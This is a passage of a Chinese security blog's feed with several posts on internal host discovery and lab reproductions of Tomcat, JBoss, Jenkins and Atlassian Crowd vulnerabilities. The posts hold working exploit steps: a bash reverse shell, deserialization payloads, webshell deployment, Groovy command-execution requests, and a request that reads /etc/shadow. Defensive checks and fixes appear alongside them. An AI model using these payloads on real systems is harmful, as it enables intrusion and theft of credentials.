'/22/\Mar\/2019/{ips[$1]++} END{for(i in ips){print i, ips[i]}}' | awk '$2>100' |sort -k2 -rn | head awk '/22/\Mar\/2019/{ips[$1]++} END{for(i in ips){if(ips[i]>100){print i, ips[i]}}}' | # >100的才打印 awk '$2>100' |sort -k2 -rn | head #【思路】 将要统计的字段作为数组的索引 ### awk函数 # 统计用户名为4个字符的用户 awk -F: '$1~/^....$/{count++;print $1} END{print "count is:" count}' /etc/passwd # length awk -F: 'length($1)==4{count++;print $1} END{print "count is:" count}' /etc/passwd ### awk自定义变量(外部变量) # 1.再双引号里面 var=bash echo "unix script" |awk "gsub(/unix/, \"$var\")" # 转义双引号，里面是$变量 # 2.两个双引号里面套个单引号 echo "unix script" |awk 'gsub(/unix/, "'"$var\"'")' # df -h |awk '{ if(int($5)>10){print $6":"$5} }' # 再函数外面单引号情况下 i=10 df -h |awk '{ if(int($5)>'''$i'''){print $6":"$5} }' # 3.建议： -v awk -v user=root -F:'$1 == user' /etc/passwd # 在-v的时候定义变量user=root var=bash echo "unix script" |awk "gsub(/unix/, var)" # 前面造一条命令，传给bash执行 arp -n |awk '/^[0-9]/{print "arp -d $1"}' |bash 实例实践中再写….. 附其他参考文章： https://blog.csdn.net/u011436427/article/details/103815680 https://mp.weixin.qq.com/s/dXLlFgQS_3KHm8YRyDC7ZQ document.querySelectorAll('.github-emoji') .forEach(el => { if (!el.dataset.src) { return; } const img = document.createElement('img'); img.style = 'display:none !important;'; img.src = el.dataset.src; img.addEventListener('error', () => { img.remove(); el.style.color = 'inherit'; el.style.backgroundImage = 'none'; el.style.background = 'none'; }); img.addEventListener('load', () => { img.remove(); }); document.body.appendChild(img); });]]></content>
  </entry>
  <entry>
    <title><![CDATA[发现内网存活主机方法-简单整理]]></title>
    <url>%2Fposts%2F48517%2F</url>
    <content type="text"><![CDATA[基于UDP发现内网存活主机 UDP显著特性:1.UDP 缺乏可靠性。UDP 本身不提供确认,超时重传等机制。UDP 数据报可能在网络中被复制,被重新排序,也不保证每个数据报只到达一次。2.UDP 数据报是有长度的。每个 UDP 数据报都有长度,如果一个数据报正确地到达目的地,那么该数据报的长度将随数据一起传递给接收方。而 TCP 是一个字节流协议,没有任何(协议上的)记录边界。3.UDP 是无连接的。UDP 客户和服务器之前不必存在长期的关系。大多数的UDP实现中都选择忽略源站抑制差错,在网络拥塞时,目的端无法接收到大量的UDP数据报4.UDP 支持多播和广播。 1.nmap扫描# -sU nmap -sU -T5 -sV --max-retries 1 192.168.1.100 -p 500 2.msf扫描use auxiliary/scanner/discovery/udp_probe # 或这个模块 use auxiliary/scanner/discovery/udp_sweep 3.unicornscan扫描Linux下推荐 unicornscan -mU 192.168.1.100 4.ScanLine扫描McAfee出品,win下使用推荐。管理员执行。项目地址:https://www.mcafee.com/ca/downloads/free-tools/scanline.aspx网盘地址:http://pan.baidu.com/s/1i4A1wLR 密码:hvyx自己搜索资源吧 输入sl运行ScanLine 5.在线基于Nmap的udp扫描:点击链接 基于ARP发现内网存活主机1.nmap扫描nmap -sn -PR 192.168.1.1/24 2.msf扫描use auxiliary/scanner/discovery/arp_sweep ... 3.netdiscovernetdiscover -r 192.168.1.0/24 -i wlan0 4.arp-scan(linux)(推荐)速度与快捷项目地址:https://linux.die.net/man/1/arp-scanarp-scan没有内置kali,需要下载安装。 apt-get install arp-scan arp-scan --interface=wlan0 --localnet 5.Powershellpowershell.exe -exec bypass -Command "Import-Module .\arpscan.ps1;Invoke-ARPScan -CIDR 192.168.1.0/24" 6.arp scannet项目地址: https://sourceforge.net/projects/arpscannet/files/arpscannet/arpscannet%200.4/ 7.arp-scan(windows)(推荐)速度与快捷项目地址:https://github.com/QbsuranAlang/arp-scan-windows-/tree/master/arp-scan(非官方) arp-scan.exe -t 192.168.1.1/24 8.arp-ping.exearp-ping.exe 192.168.1.100 9.其他如cain的arp发现,一些开源py,pl脚本等,不一 一介绍。 下载的工具，后门自查 基于netbios发现内网存活主机IBM公司开发,主要用于数十台计算机的小型局域网。该协议是一种在局域网上的程序可以使用的应用程序编程接口(API),为程序提供了请求低级服务的同一的命令集,作用是为了给局域网提供网络以及其他特殊功能。系统可以利用WINS服务、广播及Lmhost文件等多种模式将NetBIOS名-——特指基于NETBIOS协议获得计算机名称——解析为相应IP地址,实现信息通讯,所以在局域网内部使用NetBIOS协议可以方便地实现消息通信及资源的共享。 1.nmap扫描# nbstat.nse nmap -sU --script nbstat.nse -p137 192.168.1.0/24 -T4 2.msf扫描use auxiliary/scanner/netbios/nbname 3.nbtscan扫描项目地址: http://www.unixwiz.net/tools/nbtscan.htmlNBTscan version 1.5.1: https://github.com/scallywag/nbtscan ### Windows nbtscan-1.0.35.exe -m 192.168.1.0/24 nbtscan -n # 推荐 ### Linux （推荐） tar -zxvf ./nbtscan-source-1.0.35.tgz # (其他版本自己寻找) make nbtscan -r 192.168.1.0/24 nbtscan -v -s: 192.168.1.0/24 4.NetBScanner:项目地址:https://www.nirsoft.net/utils/netbios_scanner.html 基于snmp发现内网存活主机SNMP协议主要由两大部分构成: SNMP管理站和SNMP代理。SNMP管理站是一个中心节点,负责收集维护各个SNMP元素的信息,并对这些信息进行处理,最后反馈给网络管理员;而SNMP代理是运行在各个被管理的网络节点之上,负责统计该节点的各项信息,并且负责与SNMP管理站交互,接收并执行管理站的命令,上传各种本地的网络信息 1.nmap扫描nmap -sU --script snmp-brute 192.168.1.0/24 -T4 2.msf扫描use auxiliary/scanner/snmp/snmp_enum 3.SMBScan项目地址:https://www.mcafee.com/us/downloads/free-tools/snscan.aspx依然是一块macafee出品的攻击 4.NetCrunch项目地址:https://www.adremsoft.com/demo/内网安全审计工具,包含了DNS审计,ping扫描,端口,网络服务等。 5.snmp for pl扫描:项目地址:https://github.com/dheiland-r7/snmp 其他扫描:6.snmpbulkwalk 7.snmp-check 8.snmptest 附录 use auxiliary/scanner/snmp/aix_version use auxiliary/scanner/snmp/snmp_enumuse auxiliary/scanner/snmp/arris_dg950 use auxiliary/scanner/snmp/snmp_enum_hp_laserjet use auxiliary/scanner/snmp/brocade_enumhash use auxiliary/scanner/snmp/snmp_enumshares use auxiliary/scanner/snmp/cambium_snmp_loot use auxiliary/scanner/snmp/snmp_enumusers use auxiliary/scanner/snmp/cisco_config_tftp use auxiliary/scanner/snmp/snmp_login use auxiliary/scanner/snmp/cisco_upload_file use auxiliary/scanner/snmp/snmp_set use auxiliary/scanner/snmp/netopia_enum use auxiliary/scanner/snmp/ubee_ddw3611 use auxiliary/scanner/snmp/sbg6580_enum use auxiliary/scanner/snmp/xerox_workcentre_enumusers 其他内网安全审计工具(snmp):项目地址: https://www.solarwinds.com/topics/snmp-scanner项目地址: https://www.netscantools.com/nstpro_snmp.html snmp for pl : wget http://www.cpan.org/modules/by-module/NetAddr/NetAddr-IP-4.078.tar.gz tar xvzf ./NetAddr-IP-4.078.tar.gz cd NetAddr-IP-4.078/ perl Makefile.PL make make install ./snmpbw.pl 基于ICMP发现内网存活主机 1.nmap扫描nmap ‐sP ‐PI 192.168.1.0/24 ‐T4 nmap ‐sn ‐PE ‐T4 192.168.1.0/24 2.CMD下扫描for /L %P in (1,1,254) DO @ping ‐w 1 ‐n 1 192.168.1.%P | findstr "TTL=" 3.powershell扫描# powershell脚本 ./Invoke‐TSPingSweep.ps1 powershell.exe ‐exec bypass ‐Command "Import‐Module ./Invoke‐TSPingSwe ep.ps1; Invoke‐TSPingSweep ‐StartAddress 192.168.1.1 ‐EndAddress 192.168.1.2 54 ‐ResolveHost ‐ScanPort ‐Port 445,135" # 或 tcping.exe ‐n 1 192.168.1.0 80 基于SMB发现内网存活主机1.基于msf# 模块 scanner/smb/smb_version 2.基于cme(参考第九十三课)cme smb 192.168.1.0/24 3.基于nmapnmap ‐sU ‐sS ‐‐script smb‐enum‐shares.nse ‐p 445 192.168.119 4.基于CMDfor /l %a in (1,1,254) do start /min /low telnet 192.168.1.%a 445 5.基于powershell## 一句话扫描: #单IP: 445 | %{ echo ((new‐object Net.Sockets.TcpClient).Connect("192.168.1.119",$_)) "$_ is open"} 2>$null #多ip: 1..5 | % { $a = $_; 445 | % {echo ((new‐objectNet.Sockets.TcpClient).Connect("192.168.1.$a",$_)) "Port $_ is open"}2>$null} #多port,多IP: 118..119 | % { $a = $_; write‐host "‐‐‐‐‐‐"; write‐host "192.168.1.$a"; 80,445 | % {echo ((new‐object Net.Sockets.TcpClient).Connect("192.168.1.$a",$_)) "Port $_ is open"} 2>$null} 基于MSF发现内网存活主机 一search搜索 search scanner type:auxiliary 主要介绍scanner下的五个模块,辅助发现内网存活主机,分别为: auxiliary/scanner/discovery/arp_sweep # 发现内网存活主机 auxiliary/scanner/discovery/udp_sweep # 发现内网存活主机 auxiliary/scanner/ftp/ftp_version # 发现FTP服务 auxiliary/scanner/http/http_version # 发现HTTP服务 auxiliary/scanner/smb/smb_version # 发现SMB服务 二主要介绍scanner下的五个模块,辅助发现内网存活主机,分别为: auxiliary/scanner/ssh/ssh_version # 发现SSH服务 auxiliary/scanner/telnet/telnet_version # 发现TELNET服务 auxiliary/scanner/discovery/udp_probe # 发现内网存活主机 auxiliary/scanner/dns/dns_amp # 发现内网存活主机 auxiliary/scanner/mysql/mysql_version # 发现mysql服务 三主要介绍scanner下的五个模块,辅助发现内网存活主机,分别为: auxiliary/scanner/netbios/nbname # 发现内网存活主机 auxiliary/scanner/http/title # 发现内网存活主机 auxiliary/scanner/db2/db2_version # 发现db2服务 auxiliary/scanner/portscan/ack # 发现内网存活主机 auxiliary/scanner/portscan/tcp # 发现内网存活主机 四主要介绍scanner下的五个模块,辅助发现内网存活主机,分别为: auxiliary/scanner/portscan/syn # 发现内网存活主机 auxiliary/scanner/portscan/ftpbounce # 发现内网存活主机 auxiliary/scanner/portscan/xmas # 发现内网存活主机 auxiliary/scanner/rdp/rdp_scanner # 发现内网存活主机 auxiliary/scanner/smtp/smtp_version # 发现内网存活主机 五主要介绍scanner下的三个模块,以及db_nmap辅助发现内网存活主机,分别为: auxiliary/scanner/pop3/pop3_version # 发现内网存活主机 auxiliary/scanner/postgres/postgres_version # 发现内网存活主机 auxiliary/scanner/ftp/anonymous # 发现内网存活主机 db_nmap # 发现内网存活主机(MSF内置强大的端口扫描工具Nmap,为了更好的区别,内置命令为:db_nmap, 使用方法与nmap一致) #如： db_nmap ‐p 445 ‐T4 ‐sT 192.168.1.115‐120 ‐‐open hosts # 查看数据库中已发现的内网存活主机 hosts ‐h # hosts命令也支持数据库中查询与搜索,方便快速对应目标存活主机 hosts ‐S 192 # 搜索关键字 hosts ‐h 查看参数： ‐a,‐‐add Add the hosts instead of searching ‐d,‐‐delete Delete the hosts instead of searching ‐c &lt;col1,col2> Only show the given columns (see list below) ‐C &lt;col1,col2> Only show the given columns until the next restart (se e list below) ‐h,‐‐help Show this help information ‐u,‐‐up Only show hosts which are up ‐o &lt;file> Send output to a file in csv format ‐O &lt;column> Order rows by specified column number ‐R,‐‐rhosts Set RHOSTS from the results of the search ‐S,‐‐search Search string to filter by ‐i,‐‐info Change the info of a host ‐n,‐‐name Change the name of a host ‐m,‐‐comment Change the comment of a host ‐t,‐‐tag Add or specify a tag to a range of hosts 六主要介绍post下的六个模块,辅助发现内网存活主机,分别为: windows/gather/arp_scanner windows/gather/enum_ad_computers windows/gather/enum_computers windows/gather/enum_domain windows/gather/enum_domains windows/gather/enum_ad_user_comments 1.基于windows/gather/arp_scanner发现内网存活主机 meterpreter > run windows/gather/arp_scanner RHOSTS=192.168.1.110‐120 THREADS=20 2.基于windows/gather/enum_ad_computers发现域中存活主机 meterpreter > run windows/gather/enum_ad_computers 3.基于windows/gather/enum_computers发现域中存活主机 meterpreter > run windows/gather/enum_computers 4.基于windows/gather/enum_domain发现域中存活主机 meterpreter > run windows/gather/enum_domain 5.基于windows/gather/enum_domains 发现域中存活主机 meterpreter > run windows/gather/enum_domains 6.基于windows/gather/enum_ad_user_comments发现域中存活主机 meterpreter > run windows/gather/enum_ad_user_comments POST下相关模块如下： linux/gather/enum_network linux/busybox/enum_hosts windows/gather/enum_ad_users windows/gather/enum_domain_tokens windows/gather/enum_snmp document.querySelectorAll('.github-emoji') .forEach(el => { if (!el.dataset.src) { return; } const img = document.createElement('img'); img.style = 'display:none !important;'; img.src = el.dataset.src; img.addEventListener('error', () => { img.remove(); el.style.color = 'inherit'; el.style.backgroundImage = 'none'; el.style.background = 'none'; }); img.addEventListener('load', () => { img.remove(); }); document.body.appendChild(img); });]]></content>
      <categories>
        <category>渗透测试</category>
      </categories>
      <tags>
        <tag>渗透测试</tag>
        <tag>内网</tag>
        <tag>探测主机存活</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[Tomcat常见漏洞复现]]></title>
    <url>%2Fposts%2F40402%2F</url>
    <content type="text"><![CDATA[后台管理页面弱口令默认：http://127.0.0.1:8080/manager/html页面只允许本地访问，除非管理员手工修改了这些属性 1.尝试登录后台1.尝试默认账户密码：tomcat:tomcat2.如果不是，尝试用弱口令字典进行爆破 # hydra爆破manager后台 hydra -L user.txt -P user.txt -f 10.10.10.81 -s 8080 http-get /manager/html 2.部署war包 # war包生成 jar -cvf xx.war xx.jsp 3.部署后, 访问马访问 http://127.0.0.1:8080/war 包名(无后缀) / 包名内文件名 4.后续操作 安全检查查看tomcat日志 tail /root/tomcats/apache-tomcat-xxx/logs/xxxx_log # 如果出现大量401，就可能正在被爆破 查看部署的war包 # 部署路径在tomcat的webapps目录下，进行检查 # 查看部署war包的日志(tomcat的logs下)，是否有部署的痕迹 修复建议 若无必要,取消 manager/html 功能。 若要使用, manager 页面应只允许本地 IP 访问 任意文件写入(CVE-2017-12615)漏洞本质是 Tomcat 配置文件 /conf/web.xml 配置了可写( readonly=false ),导致我们可以往服务器写文件: 条件： 服务器开启了put方法； 同时tomcat存在后缀解析漏洞 复现正常状况：利用成功： 安全检查查看日志内容，如果方法是PUT， 且状态码为201，就要注意了 防御措施 禁用PUT方法(默认是禁止的，开启REST API的情况下可能会开启 –&gt; 和业务保持沟通) 设置强密码或删除Web控制台，以及示例页面(可能暴露信息)，关闭报错页面提示 将 readonly=true ,默认为 true 远程代码执行(CVE-2019-0232)影响范围: 9.0.0.M1 ~ 9.0.17, 8.5.0 ~ 8.5.39 , 7.0.0 ~ 7.0.93影响系统: Windows 环境搭建手头暂时没windows系统，从网上借鉴了一下 配置Apache Tomcat服务器（修改conf目录配置文件，启用CGI）1、打开Tomcat安装目录的apache-tomcat-8.5.39\conf\web.xml修改如下配置，在默认情况下配置是注释的。 2、打开Tomcat安装目录的apache-tomcat-8.5.39\conf\context.xml修改如下配置，添加privileged=”true” 。 3、在apache-tomcat-8.5.39\webapps\ROOT\WEB-INF目录新建一个cgi-bin文件夹，创建一个test.bat的文件，内容随意 漏洞利用POC # 访问 http://127.0.0.1:8080/cgi-bin/test.bat?&amp;dir # 执行命令 http://127.0.0.1:8080/cgi-bin/test.bat?&amp;C:/WINDOWS/system32/net+user Note:net 命令的路径要写全,直接写 net user , Tomcat 控制台会提示net 不是内部命令,也不是可运行的程序,另 必须使用 + 号连接,使用 空格 ,%2B 都会执行失败,控制台报错。 文件包含漏洞(CVE-2020-1938)该漏洞是由于Tomcat AJP协议存在缺陷而导致，攻击者利用该漏洞可通过构造特定参数，读取服务器webapp下的任意文件。若目标服务器同时存在文件上传功能，攻击者可进一步实现远程代码执行。目前，厂商已发布新版本完成漏洞修复。 受影响版本 Apache Tomcat 6 Apache Tomcat 7 &lt; 7.0.100 Apache Tomcat 8 &lt; 8.5.51 Apache Tomcat 9 &lt; 9.0.31 不受影响版本 Apache Tomcat = 7.0.100 Apache Tomcat = 8.5.51 Apache Tomcat = 9.0.31 文件包含RCE复现POC：https://github.com/0nise/CVE-2020-1938https://github.com/nibiwodong/CNVD-2020-10487-Tomcat-Ajp-lfi-POC 利用文章：https://www.cnblogs.com/Rain99-/p/12517660.htmlhttps://blog.csdn.net/SouthWind0/article/details/105147369/ 防护措施 更新到安全版本 关闭AJP服务，修改Tomcat配置文件Service.xml,注释掉：&lt;Connector port="8009" protocol="AJP/1.3" redirectPort="8443" /&gt; 配置ajp配置中的secretRequired跟secret属性来限制认证 参考https://www.cnvd.org.cn/webinfo/show/5415 document.querySelectorAll('.github-emoji') .forEach(el => { if (!el.dataset.src) { return; } const img = document.createElement('img'); img.style = 'display:none !important;'; img.src = el.dataset.src; img.addEventListener('error', () => { img.remove(); el.style.color = 'inherit'; el.style.backgroundImage = 'none'; el.style.background = 'none'; }); img.addEventListener('load', () => { img.remove(); }); document.body.appendChild(img); });]]></content>
      <categories>
        <category>渗透测试</category>
      </categories>
      <tags>
        <tag>渗透测试</tag>
        <tag>tomcat</tag>
        <tag>中间件漏洞</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[jboss常见漏洞复现]]></title>
    <url>%2Fposts%2F60637%2F</url>
    <content type="text"><![CDATA[JBoss 5.x/6.x 反序列化漏洞( CVE-2017-12149 )验证： 访问/invoker/readonly，如果返回 500 ,说明页面存在,此页面存在反序列化漏洞。 利用工具：JavaDeserH2HC步骤：1.先编译 # 我们选择一个 Gadget : ReverseShellCommonsCollectionsHashMap ,编译并生成序列化数据 javac -cp .:commons-collections-3.2.1.jar ReverseShellCommonsCollectionsHashMap.java 2.设置反弹的IP和端口： java -cp .:commons-collections-3.2.1.jar ReverseShellCommonsCollectionsHashMap 192.168.0.105:8888 # ip 是 nc 所在的 ip # 这样就会将序列化对象保存在ReverseShellCommonsCollectionsHashMap.ser中，用curl命令发送到Jboss服务地址 3.本机进行监听 nv -lvvp 8888 4.再打开另一个控制台，运行如下curl命令 curl http://192.168.0.100:8080/invoker/readonly --data-binary @ReverseShellCommonsCollectionsHashMap.ser 5.成功反弹shell JBoss JMXInvokerServlet 反序列化漏洞验证： 访问 /invoker/JMXInvokerServlet，返回如下,说明接口开放,此接口存在反序列化漏洞。 这里直接利用 CVE-2017-12149 生成的 ser ,发送到 /invoker/JMXInvokerServlet接口中。 也可以直接利用工具检测：工具下载地址 # 运行工具即可 java -jar DeserializeExploit.jar JBoss EJBInvokerServlet 反序列化漏洞验证： 访问 /invoker/EJBInvokerServlet 返回如下,说明接口开放,此接口存在反序列化漏洞。 这里直接利用 CVE-2017-12149 生成的 ser ,发送到 /invoker/EJBInvokerServlet 接口中 修复建议 不需要ttp-invoker.sar组件的用户可直接删除此组件 或添加如下代码至 http-invoker.sar 下 web.xml 的 security-constraint 标签中,对 http invoker 组件进行访问控制:&lt;url-pattern&gt;/*&lt;/url-pattern&gt; JBoss &lt;=4.x JBossMQ JMS 反序列化漏洞( CVE-2017-7504 )利用工具：JavaDeserH2HC步骤：1.先编译 # 选择ExampleCommonsCollections1WithHashMap，编译并生成序列化数据 javac -cp .:commons-collections-3.2.1.jar ExampleCommonsCollections1WithHashMap.java #编译 2.设置反弹的IP和端口： java -cp .:commons-collections-3.2.1.jar ExampleCommonsCollections1WithHashMap "bash -i >&amp; /dev/tcp/192.168.0.105/1234 0>&amp;1" #ser全称serialize，序列化恶意数据至文件。 3.本机进行监听 nv -lvvp 1234 4.再打开另一个控制台，运行如下curl命令 #该ser文件作为请求数据主体发送如下数据包 curl http://192.168.0.100:8080/jbossmq-httpil/HTTPServerILServlet --data-binary @ExampleCommonsCollections1WithHashMap.ser # --data-binary 意为以二进制的方式post数据 5.成功反弹shell JMX Console 未授权访问漏洞描述未授权访问管理控制台,通过该漏洞,可以后台管理服务,可以通过脚本命令执行系统命令,如反弹shell,wget写webshell文件。 环境搭建使用vulhub cd vulhub/jboss/CVE-2017-7504/ docker-compose up -d # 浏览器访问 复现1.未授权访问测试（无无需认证进入入控制⻚页面面） http://192.168.0.100:8080/ # 进入控制页 JMX Console http://192.168.0.100:8080/jmx-console/ 2.点击jboss.deployment进入应用部署页面 3.使用apache搭建远程木马服务器(这里在kali上搭建) # war马的制作方式：https://www.peekeyes.com/2020/01/13/%E5%88%B6%E4%BD%9Cwar%E6%9C%A8%E9%A9%AC%E5%B9%B6%E4%B8%94%E6%8B%BF%E4%B8%8Bwebshell/ jar cvf shell.war shell.jsp 4.通过addurl参数进行木马的远程部署 地址写远程服务器war马的地址 成功部署 5.连接木马 http://192.168.0.100:8080/shell/shell.jsp 防护 对jmx控制页面访问添加访问验证。 进行JMX Console 安全配置。 document.querySelectorAll('.github-emoji') .forEach(el => { if (!el.dataset.src) { return; } const img = document.createElement('img'); img.style = 'display:none !important;'; img.src = el.dataset.src; img.addEventListener('error', () => { img.remove(); el.style.color = 'inherit'; el.style.backgroundImage = 'none'; el.style.background = 'none'; }); img.addEventListener('load', () => { img.remove(); }); document.body.appendChild(img); });]]></content>
      <categories>
        <category>渗透测试</category>
      </categories>
      <tags>
        <tag>渗透测试</tag>
        <tag>未授权访问</tag>
        <tag>中间件漏洞</tag>
        <tag>JBoss</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[Jenkins一些安全问题]]></title>
    <url>%2Fposts%2F63696%2F</url>
    <content type="text"><![CDATA[漏洞简介及危害默认情况下 Jenkins面面板中用户可以选择执行脚本界面来操作一些系统层命令,攻击者可通过未授权访问漏洞或者暴力破解用户密码等进入后台管理服务,通过脚本执行行界面从而获取服务器权限。 环境搭建# 下载地址： https://www.jenkins.io/download/ # 可以直接下载war包 java -jar jenkins.war # 运行 # wget http://mirrors.jenkins.io/debian/jenkins_1.621_all.deb # 下载 dpkg -i jenkins_1.621_all.deb # 安装 sudo apt-get -f --fix-missing install # 如果有报依赖项的错误时执行行行 service jenkinis start # 开启Jenkins服务 浏览器器访问http://192.168.0.100:8080/ 未授权访问测试访问http://192.168.0.100:8080/manage可以看到没有任何限制可以直接访问 Jenkins未授权访问写shell1.点击“脚本命令行” 2.执行系统命令 println "whoami".execute().text 3.利用“脚本命令行”写webshell,(需要一定的权限且知道网站绝对路径)，点击运行,写入成功 new File ("/var/www/html/shell.php").write('&lt;?php phpinfo(); ?>'); 4.访问shell.php， 测试成功 CVE-2017-1000353 这是一个java反序列化漏洞 执行如下命令启动jenkins 2.46.1： docker-compose up -d 等待完全启动成功后，访问http://your-ip:8080即可看到jenkins已成功运行，无需手工安装。 原理参考： https://blogs.securiteam.com/index.php/archives/3171 测试1.生成序列化字符串 # 参考 https://github.com/vulhub/CVE-2017-1000353 # 首先下载POC生成工具： https://github.com/vulhub/CVE-2017-1000353/releases/download/1.1/CVE-2017-1000353-1.1-SNAPSHOT-all.jar # 执行下面命令，生成字节码文件 java -jar CVE-2017-1000353-1.1-SNAPSHOT-all.jar jenkins_poc.ser "touc /tmp/success" # jenkins_poc.ser是生成的字节码文件名 # "touch ..."是待执行的任意命令 # 生成jenkins_poc.ser文件，这就是序列化字符串。 2.生成jenkins_poc.ser文件，这就是序列化字符串。 # 下载 https://github.com/vulhub/CVE-2017-1000353/blob/master/exploit.py # Python3执行 python3 exploit.py http://192.168.0.100:8080 jenkins_poc.ser # 将刚才生成的字节码文件发送给目标 3.进入docker容器发现文件创建成功 CVE-2018-1000861Jenkins使用Stapler框架开发，其允许用户通过URL PATH来调用一次public方法。由于这个过程没有做限制，攻击者可以构造一些特殊的PATH来执行一些敏感的Java方法。通过这个漏洞，我们可以找到很多可供利用的利用链。其中最严重的就是绕过Groovy沙盒导致未授权用户可执行任意命令：Jenkins在沙盒中执行Groovy前会先检查脚本是否有错误，检查操作是没有沙盒的，攻击者可以通过Meta-Programming的方式，在检查这个步骤时执行任意命令。 测试执行如下命令启动一个Jenkins 2.138，包含漏洞的插件也已经安装： docker-compose up -d 使用 @orangetw 给出的一键化POC脚本，发送如下请求即可成功执行命令： http://192.168.0.100:8080/securityRealm/user/admin/descriptorByName/org.jenkinsci.plugins.scriptsecurity.sandbox.groovy.SecureGroovyScript/checkScript ?sandbox=true &amp;value=public class x { public x(){ "touch /tmp/success".execute() } } # 请求替换到burp拦截的数据包中 数据包如下 GET /securityRealm/user/admin/descriptorByName/org.jenkinsci.plugins.scriptsecurity.sandbox.groovy.SecureGroovyScript/checkScript?sandbox=true&amp;value=public%20class%20x%20{public%20x(){%22touch%20/tmp/CVE-2018-1000861_is_success%22.execute()}} HTTP/1.1 Host: 192.168.0.100:8080 User-Agent: Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:76.0) Gecko/20100101 Firefox/76.0 Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8 Accept-Language: zh-CN,zh;q=0.8,zh-TW;q=0.7,zh-HK;q=0.5,en-US;q=0.3,en;q=0.2 Accept-Encoding: gzip, deflate Connection: close Cookie: JSESSIONID.a3c40b9a=node010r4vkf3cix27hr5qd9qvw5y41.node0; screenResolution=1920x1080 Upgrade-Insecure-Requests: 1 Cache-Control: max-age=0 进入容器: docker-compose exec jenkins bash,看到 /tmp/success文件创建成功 配置方面的安全问题1.允许任意账户注册 带来的安全问题关闭用户注册 2.允许匿名访问带来的问题建议关闭 jenkins的日志功能不是很好（可以使用代理，并进行操作的记录） 安全建议 使用最新版的jenkins 关闭匿名访问 关闭用户注册功能 用户严格授权 最小化插件，相关插件使用最新版 使用nginx代理jenkins，不要直接暴露在公网 参考：https://www.secpulse.com/archives/2166.html document.querySelectorAll('.github-emoji') .forEach(el => { if (!el.dataset.src) { return; } const img = document.createElement('img'); img.style = 'display:none !important;'; img.src = el.dataset.src; img.addEventListener('error', () => { img.remove(); el.style.color = 'inherit'; el.style.backgroundImage = 'none'; el.style.background = 'none'; }); img.addEventListener('load', () => { img.remove(); }); document.body.appendChild(img); });]]></content>
      <categories>
        <category>渗透测试</category>
      </categories>
      <tags>
        <tag>未授权访问</tag>
        <tag>Jenkins</tag>
        <tag> CVE-2017-1000353</tag>
        <tag>CVE-2018-1000861</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[Atlassian Crowd未授权访问漏洞]]></title>
    <url>%2Fposts%2F4469%2F</url>
    <content type="text"><![CDATA[漏洞概述Atlassian Crowd和Atlassian Crowd Data Center都是澳大利亚Atlassian公司的产品。Atlassian Crowd是一套基于Web的单点登录系统。该系统为用用户、网络应用程序和目录服务器提供验证、授权等功能。Atlassian Crowd Data Center是Crowd的集群部署版。Atlassian Crowd和Crowd Data Center在其某些发行版本中错误地启用了了pdkinstall开发插件,使其存在安全漏漏洞洞。攻击者利用该漏洞可在未授权访问的情况下对Atlassian Crowd和Crowd Data Center安装任意的恶意插件,执行任意代码/命令,从而获得服务器权限 环境搭建wget https://product-downloads.atlassian.com/software/crowd/downloads/atlassian-crowd-3.4.3.zip unzip atlassian-crowd-3.4.3.zip cd atlassian-crowd-3.4.3 vim crowd-webapp/WEB-INF/classes/crowd-init.properties #修改crowd-init.properties 配置文件，设置主目录 crowd.home=/var/crowd-home # 主目录位置(根据自己的写) # 执行启动命令 ./start_crowd.sh 浏览器访问http://192.168.0.100:8095 点击Set up Crowd这里去官网申请试用30天https://my.atlassian.com/products/index并填写到license 进行下一步安装,直到安装完成。 未授权访问测试安装完成之后在插件目录会有一些插件bundled-plugins上传一个标准的插件,来自atlassian-bundled-plugins中的applinks-plugin-5.4.12.jar curl --form "file_cdl=@applinks-plugin-5.4.12.jar" http://192.168.0.100:8095/crowd/admin/uploadplugin.action -v Atlassian Crowd RCE该漏洞源于网络系统或产品未对输入的数据进行正确的验证。受影响的产品及版本包括：Atlassian Crowd 2.1.x版本，3.0.5之前的3.0.x版本，3.1.6之前的3.1.x版本，3.2.8之前的3.2.x版本，3.3.5之前的3.3.x版本，3.4.4之前的3.4.版本；Atlassian Crowd Data Center 2.1.x版本，3.0.5之前的3.0.x版本，3.1.6之前的3.1.x版本，3.2.8之前的3.2.x版本，3.3.5之前的3.3.x版本，3.4.4之前的3.4.版本。 漏洞利用脚本：https://github.com/jas502n/CVE-2019-11580 git clone https://github.com/jas502n/CVE-2019-11580 cd CVE-2019-11580/ python CVE-2019-11580.py http://192.168.0.100:8095 # 通过浏览器访问链接测试其他命令 curl http://192.168.0.100:8095/crowd/plugins/servlet/exp?cmd=cat%20/etc/shadow 防御手段 设置访问/crowd/admin/uploadplugin.action的源ip 升级最新版本(3.5.0以上)。 document.querySelectorAll('.github-emoji') .forEach(el => { if (!el.dataset.src) { return; } const img = document.createElement('img'); img.style = 'display:none !important;'; img.src = el.dataset.src; img.addEventListener('error', () => { img.remove(); el.style.color = 'inherit'; el.style.backgroundImage = 'none'; el.style.background = 'none'; }); img.addEventListener('load', () => { img.remove(); }); document.body.appendChild(img); });]]></content>
      <categories>
        <category>渗透测试</category>
      </categories>
      <tags>
        <tag>未授权访问</tag>
        <tag>Atlassian Crowd</tag>
        <tag>远程命令执行</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[CouchDB未授权访问&命令执行]]></title>
    <url>%2Fposts%2F78%2F</url>
